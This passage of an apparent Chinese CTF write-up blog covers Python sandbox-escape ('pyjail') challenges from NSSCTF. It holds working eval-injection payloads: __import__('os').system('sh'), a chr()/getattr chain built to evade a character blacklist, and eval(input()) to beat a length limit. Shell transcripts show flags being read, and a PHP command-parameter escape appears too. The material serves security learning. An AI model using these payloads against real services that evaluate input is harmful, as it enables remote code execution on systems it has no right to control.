G</code>，就可以通过实现<code>__rmul__</code>来实现。</li><li><code>__and__</code>，<code>__or__</code>、<code>__xor__</code>：逻辑运算，和算术运算类似；</li><li><code>__eq__</code>，<code>__ne__</code>、<code>__lt__</code>、<code>__gt__</code>、<code>__le__</code>、<code>__ge__</code>：比较运算，和算术运算类似；例如<code>&#39;贵州&#39; &gt; &#39;广西&#39;</code>，就会转而调用<code>&#39;贵州&#39;.__gt__(&#39;广西&#39;)</code>；</li><li><code>__getattr__</code>：对象是否含有某属性。如果我们对对象<code>a</code>所对应的类实现了该方法，那么在调用未实现的<code>a.b</code>时，就会转而调用<code>a.__getattr__(b)</code>。这也等价于用函数的方法调用：<code>getattr(a, &#39;b&#39;)</code>。有<code>__getattr__</code>，自然也有对应的<code>__setattr__</code>；</li><li><code>__subclasses__</code>：返回当前类的所有子类。一般是用在<code>object</code>类中，在<code>object.__subclasses__()</code>中，我们可以找到<code>os</code>模块中的类，然后再找到<code>os</code>，并且执行<code>os.system</code>，实现RCE。</li></ul></li><li><code>dir</code>：查看对象的所有属性和方法。在我们没有思路的时候，可以通过该函数查看所有可以利用的方法；此外，在题目禁用引号以及小数点时，也可以先用拿到类所有可用方法，再索引到方法名，并且通过<code>getattr</code>来拿到目标方法。</li><li><code>chr</code>、<code>ord</code>：字符与ASCII码转换函数，能帮我们绕过一些WAF</li><li><code>globals</code>：返回所有全局变量的函数；</li><li><code>locals</code>：返回所有局部变量的函数；</li><li><code>__import__</code>：载入模块的函数。例如<code>import os</code>等价于<code>os = __import__(&#39;os&#39;)</code>；</li><li><code>__name__</code>：该变量指示当前运行环境位于哪个模块中。如我们python一般写的<code>if __name__ == &#39;__main__&#39;:</code>，就是来判断是否是直接运行该脚本。如果是从另外的地方import的该脚本的话，那<code>__name__</code>就不为<code>__main__</code>，就不会执行之后的代码。更多参考<a href="https://link.zhihu.com/?target=https://www.geeksforgeeks.org/__name__-a-special-variable-in-python/">这里</a>；</li><li><code>__builtins__</code>：包含当前运行环境中默认的所有函数与类。如上面所介绍的所有默认函数，如<code>str</code>、<code>chr</code>、<code>ord</code>、<code>dict</code>、<code>dir</code>等。在pyjail的沙箱中，往往<code>__builtins__</code>被置为<code>None</code>，因此我们不能利用上述的函数。所以一种思路就是我们可以先通过类的基类和子类拿到<code>__builtins__</code>，再<code>__import__(&#39;os&#39;).system(&#39;sh&#39;)</code>进行RCE；</li><li><code>__file__</code>：该变量指示当前运行代码所在路径。如<code>open(__file__).read()</code>就是读取当前运行的python文件代码。需要注意的是，<strong>该变量仅在运行代码文件时会产生，在运行交互式终端时不会有此变量</strong>；</li><li><code>_</code>：该变量返回上一次运行的python语句结果。需要注意的是，<strong>该变量仅在运行交互式终端时会产生，在运行代码文件时不会有此变量</strong>。</li></ul><p><strong>breakpoint 函数</strong></p><p>breakpoint()是3.7以后引入的内置函数，可以用于断点调试</p><p>pdb 模块定义了一个交互式源代码调试器，用于 Python 程序。它支持在源码行间设置（有条件的）断点和单步执行，检视堆栈帧，列出源码列表，以及在任何堆栈帧的上下文中运行任意 Python 代码。它还支持事后调试，可以在程序控制下调用。</p><p>在输入 breakpoint() 后可以代开 Pdb 代码调试器，在其中就可以执行任意 python 代码</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>优先考虑RCE起手式一种是 os.system(‘sh’)进入交互终端，另一种是os.popen(‘ls’).read()</p><p>object.<strong>subclasses</strong>()<code>中找到</code>os<code>模块中的类（一般是</code>&lt;class ‘os._wrap_close’&gt;<code>），另一种是先拿到</code><strong>builtins</strong><code>，再</code><strong>import</strong>(‘os’).system(‘sh’)</p><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><h4 id="calc-jail-beginner"><a href="#calc-jail-beginner" class="headerlink" title="calc_jail_beginner"></a>calc_jail_beginner</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#Your goal is to read ./flag.txt</span><br><span class="hljs-comment">#You can use these payload liked `__import__(&#x27;os&#x27;).system(&#x27;cat ./flag.txt&#x27;)` or `print(open(&#x27;/flag.txt&#x27;).read())`</span><br><br>WELCOME = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">  _     ______      _                              _       _ _ </span><br><span class="hljs-string"> | |   |  ____|    (_)                            | |     (_) |</span><br><span class="hljs-string"> | |__ | |__   __ _ _ _ __  _ __   ___ _ __       | | __ _ _| |</span><br><span class="hljs-string"> | &#x27;_ \|  __| / _` | | &#x27;_ \| &#x27;_ \ / _ \ &#x27;__|  _   | |/ _` | | |</span><br><span class="hljs-string"> | |_) | |___| (_| | | | | | | | |  __/ |    | |__| | (_| | | |</span><br><span class="hljs-string"> |_.__/|______\__, |_|_| |_|_| |_|\___|_|     \____/ \__,_|_|_|</span><br><span class="hljs-string">               __/ |                                           </span><br><span class="hljs-string">              |___/                                            </span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-built_in">print</span>(WELCOME)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Welcome to the python jail&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Let&#x27;s have an beginner jail of calc&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Enter your expression and I will evaluate it for you.&quot;</span>)<br>input_data = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;&gt; &quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Answer: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">eval</span>(input_data)))<br><br></code></pre></td></tr></table></figure><p>可以根据提示构建payload得到flag</p><p>也可以get交互式shell</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs py">nc node5.anna.nssctf.cn <span class="hljs-number">28782</span><br><br>  _     ______      _                              _       _ _<br> | |   |  ____|    (_)                            | |     (_) |<br> | |__ | |__   __ _ _ _ __  _ __   ___ _ __       | | __ _ _| |<br> | <span class="hljs-string">&#x27;_ \|  __| / _` | | &#x27;</span>_ \| <span class="hljs-string">&#x27;_ \ / _ \ &#x27;</span>__|  _   | |/ _` | | |<br> | |_) | |___| (_| | | | | | | | |  __/ |    | |__| | (_| | | |<br> |_.__/|______\__, |_|_| |_|_| |_|\___|_|     \____/ \__,_|_|_|<br>               __/ |<br>              |___/<br><br>Welcome to the python jail<br>Let<span class="hljs-string">&#x27;s have an beginner jail of calc</span><br><span class="hljs-string">Enter your expression and I will evaluate it for you.</span><br><span class="hljs-string">&gt;  __import__(&#x27;</span>os<span class="hljs-string">&#x27;).system(&#x27;</span>sh<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">sh: 0: can&#x27;</span>t access tty; job control turned off<br>$ ls<br>flag  server.py<br>$ cat flag<br>flag=NSSCTF&#123;fb867efc-bcf4-4f2b-b340-41ee9ad4a5e8&#125;<br></code></pre></td></tr></table></figure><h4 id="calc-jail-beginner-level1"><a href="#calc-jail-beginner-level1" class="headerlink" title="calc_jail_beginner_level1"></a>calc_jail_beginner_level1</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#the function of filter will banned some string &#x27;,&quot;,i,b</span><br><span class="hljs-comment">#it seems banned some payload </span><br><span class="hljs-comment">#Can u escape it?Good luck!</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">filter</span>(<span class="hljs-params">s</span>):<br>    not_allowed = <span class="hljs-built_in">set</span>(<span class="hljs-string">&#x27;&quot;\&#x27;`ib&#x27;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">any</span>(c <span class="hljs-keyword">in</span> not_allowed <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> s)<br><br>WELCOME = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">  _                _                           _       _ _   _                _ __ </span><br><span class="hljs-string"> | |              (_)                         (_)     (_) | | |              | /_ |</span><br><span class="hljs-string"> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| || |</span><br><span class="hljs-string"> | &#x27;_ \ / _ \/ _` | | &#x27;_ \| &#x27;_ \ / _ \ &#x27;__|   | |/ _` | | | | |/ _ \ \ / / _ \ || |</span><br><span class="hljs-string"> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ || |</span><br><span class="hljs-string"> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_||_|</span><br><span class="hljs-string">              __/ |                          _/ |                                  </span><br><span class="hljs-string">             |___/                          |__/                                                                                      </span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-built_in">print</span>(WELCOME)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Welcome to the python jail&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Let&#x27;s have an beginner jail of calc&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Enter your expression and I will evaluate it for you.&quot;</span>)<br>input_data = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;&gt; &quot;</span>)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">filter</span>(input_data):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Oh hacker!&quot;</span>)<br>    exit(<span class="hljs-number">0</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Answer: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">eval</span>(input_data)))<br><br></code></pre></td></tr></table></figure><p>也就是说，我们能通过<code>eval</code>执行任意命令，但是命令不能包含双引号、单引号、反引号、字母<code>i</code>和字母<code>b</code>。许多命令，如<code>import</code>、<code>__builtins__</code>、<code>bytes</code>都无法用。</p><p>Show subclasses with tuple开始</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py">().__class__.__base__.__subclasses__()<br></code></pre></td></tr></table></figure><p>b用不了，因此想到getattr()</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-built_in">getattr</span>(().__class__, <span class="hljs-string">&#x27;__base__&#x27;</span>).__subclasses__()<br></code></pre></td></tr></table></figure><p>但是引号都被banl，可以使用chr函数</p><p>‘<strong>base</strong>‘</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-built_in">chr</span>(<span class="hljs-number">95</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">95</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">98</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">97</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">115</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">101</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">95</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">95</span>)<br></code></pre></td></tr></table></figure><p><strong>subclasses</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-built_in">chr</span>(<span class="hljs-number">95</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">95</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">115</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">117</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">98</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">99</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">108</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">97</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">115</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">115</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">101</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">115</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">95</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">95</span>))<br></code></pre></td></tr></table></figure><p>绕过WAF</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-built_in">getattr</span>(<span class="hljs-built_in">getattr</span>(().__class__,<span class="hljs-built_in">chr</span>(<span class="hljs-number">95</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">95</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">98</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">97</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">115</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">101</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">95</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">95</span>)),<span class="hljs-built_in">chr</span>(<span class="hljs-number">95</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">95</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">115</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">117</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">98</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">99</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">108</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">97</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">115</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">115</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">101</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">115</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">95</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">95</span>))()<br></code></pre></td></tr></table></figure><p>找到os 在 ().<strong>class</strong>.<strong>base</strong>.<strong>subclasses</strong>()[-4].<strong>init</strong>.<strong>globals</strong><a href="'sh'">‘system’</a></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py">().__class__.__base__.__subclasses__()[-<span class="hljs-number">4</span>].__init__.__globals__[<span class="hljs-string">&#x27;system&#x27;</span>](<span class="hljs-string">&#x27;sh&#x27;</span>)<br></code></pre></td></tr></table></figure><p>绕过WAF</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-built_in">getattr</span>(<span class="hljs-built_in">getattr</span>(<span class="hljs-built_in">getattr</span>(<span class="hljs-built_in">getattr</span>(().__class__,<span class="hljs-built_in">chr</span>(<span class="hljs-number">95</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">95</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">98</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">97</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">115</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">101</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">95</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">95</span>)),<span class="hljs-built_in">chr</span>(<span class="hljs-number">95</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">95</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">115</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">117</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">98</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">99</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">108</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">97</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">115</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">115</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">101</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">115</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">95</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">95</span>))()[-<span class="hljs-number">4</span>],<span class="hljs-built_in">chr</span>(<span class="hljs-number">95</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">95</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">105</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">110</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">105</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">116</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">95</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">95</span>)),<span class="hljs-built_in">chr</span>(<span class="hljs-number">95</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">95</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">103</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">108</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">111</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">98</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">97</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">108</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">115</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">95</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">95</span>))[<span class="hljs-built_in">chr</span>(<span class="hljs-number">115</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">121</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">115</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">116</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">101</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">109</span>)](<span class="hljs-built_in">chr</span>(<span class="hljs-number">115</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">104</span>))<br></code></pre></td></tr></table></figure><p>然后进如shell交互界面</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment"># nc node5.anna.nssctf.cn 28230</span><br><br>  _                _                           _       _ _   _                _ __<br> | |              (_)                         (_)     (_) | | |              | /_ |<br> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| || |<br> | <span class="hljs-string">&#x27;_ \ / _ \/ _` | | &#x27;</span>_ \| <span class="hljs-string">&#x27;_ \ / _ \ &#x27;</span>__|   | |/ _` | | | | |/ _ \ \ / / _ \ || |<br> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ || |<br> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_||_|<br>              __/ |                          _/ |<br>             |___/                          |__/<br><br><br>Welcome to the python jail<br>Let<span class="hljs-string">&#x27;s have an beginner jail of calc</span><br><span class="hljs-string">Enter your expression and I will evaluate it for you.</span><br><span class="hljs-string">&gt; getattr(getattr(getattr(getattr(().__class__,chr(95)+chr(95)+chr(98)+chr(97)+chr(115)+chr(101)+chr(95)+chr(95)),chr(95)+chr(95)+chr(115)+chr(117)+chr(98)+chr(99)+chr(108)+chr(97)+chr(115)+chr(115)+chr(101)+chr(115)+chr(95)+chr(95))()[-4],chr(95)+chr(95)+chr(105)+chr(110)+chr(105)+chr(116)+chr(95)+chr(95)),chr(95)+chr(95)+chr(103)+chr(108)+chr(111)+chr(98)+chr(97)+chr(108)+chr(115)+chr(95)+chr(95))[chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)](chr(115)+chr(104))</span><br><span class="hljs-string">sh: 0: can&#x27;</span>t access tty; job control turned off<br>$ ls<br>flag  server.py<br>$ cat flag<br>flag=NSSCTF&#123;99f92fea-d1e0-4c04-<span class="hljs-number">8626</span>-7489979ba8da&#125;<br></code></pre></td></tr></table></figure><h4 id="calc-jail-beginner-level2"><a href="#calc-jail-beginner-level2" class="headerlink" title="calc_jail_beginner_level2"></a>calc_jail_beginner_level2</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#the length is be limited less than 13</span><br><span class="hljs-comment">#it seems banned some payload </span><br><span class="hljs-comment">#Can u escape it?Good luck!</span><br><br>WELCOME = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">  _                _                           _       _ _   _                _ ___  </span><br><span class="hljs-string"> | |              (_)                         (_)     (_) | | |              | |__ \ </span><br><span class="hljs-string"> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| |  ) |</span><br><span class="hljs-string"> | &#x27;_ \ / _ \/ _` | | &#x27;_ \| &#x27;_ \ / _ \ &#x27;__|   | |/ _` | | | | |/ _ \ \ / / _ \ | / / </span><br><span class="hljs-string"> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ |/ /_ </span><br><span class="hljs-string"> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|____|</span><br><span class="hljs-string">              __/ |                          _/ |                                    </span><br><span class="hljs-string">             |___/                          |__/                                                                            </span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-built_in">print</span>(WELCOME)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Welcome to the python jail&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Let&#x27;s have an beginner jail of calc&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Enter your expression and I will evaluate it for you.&quot;</span>)<br>input_data = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;&gt; &quot;</span>)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(input_data)&gt;<span class="hljs-number">13</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Oh hacker!&quot;</span>)<br>    exit(<span class="hljs-number">0</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Answer: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">eval</span>(input_data)))<br><br></code></pre></td></tr></table></figure><p>该题要求payload的长度不大于13，那么就不能直接__import__(‘os’).system(‘sh’)</p><p>但是在php命令执行中，有一种参数逃逸</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">/?cmd=<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);&amp;<span class="hljs-number">1</span>=ls<br></code></pre></td></tr></table></figure><p>对于这串命令system中POST的参数就会逃逸到参数1中去，对于这个1的长度是没有一点长度限制的</p><p>像这里我们也可以采用类似的手法，想办法搞个命令里面能再输入关键命令，显然<code>input()</code>这个函数就正好符合要求</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-built_in">eval</span>(<span class="hljs-built_in">input</span>())<br></code></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs py"> nc node5.anna.nssctf.cn <span class="hljs-number">28561</span><br><br>  _                _                           _       _ _   _                _ ___<br> | |              (_)                         (_)     (_) | | |              | |__ \<br> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| |  ) |<br> | <span class="hljs-string">&#x27;_ \ / _ \/ _` | | &#x27;</span>_ \| <span class="hljs-string">&#x27;_ \ / _ \ &#x27;</span>__|   | |/ _` | | | | |/ _ \ \ / / _ \ | / /<br> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ |/ /_<br> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|____|<br>              __/ |                          _/ |<br>             |___/                          |__/<br><br>Welcome to the python jail<br>Let<span class="hljs-string">&#x27;s have an beginner jail of calc</span><br><span class="hljs-string">Enter your expression and I will evaluate it for you.</span><br><span class="hljs-string">&gt; eval(input())</span><br><span class="hljs-string">__import__(&#x27;</span>os<span class="hljs-string">&#x27;).system(&#x27;</span>sh<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">sh: 0: can&#x27;</span>t access tty; job control turned off<br>$ ls<br>flag  server.py<br>$ cat flag<br>flag=NSSCTF&#123;84302f6b-8b13-4cb2-af5e-ecb2fbc6cc89&#125;<br></code></pre></td></tr></table></figure><h4 id="calc-jail-beginner-level2-5"><a href="#calc-jail-beginner-level2-5" class="headerlink" title="calc_jail_beginner_level2.5"></a>calc_jail_beginner_level2.5</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#the length is be limited less than 13</span><br><span class="hljs-comment">#it seems banned some payload </span><br><span class="hljs-comment">#banned some unintend sol</span><br><span class="hljs-comment">#Can u escape it?Good luck!</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">filter</span>(<span class="hljs-params">s</span>):<br>    BLACKLIST = [<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-string">&quot;input&quot;</span>,<span class="hljs-string">&quot;eval&quot;</span>]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> BLACKLIST:<br>        <span class="hljs-keyword">if</span> i <span class="hljs-keyword">in</span> s:<br>            <span 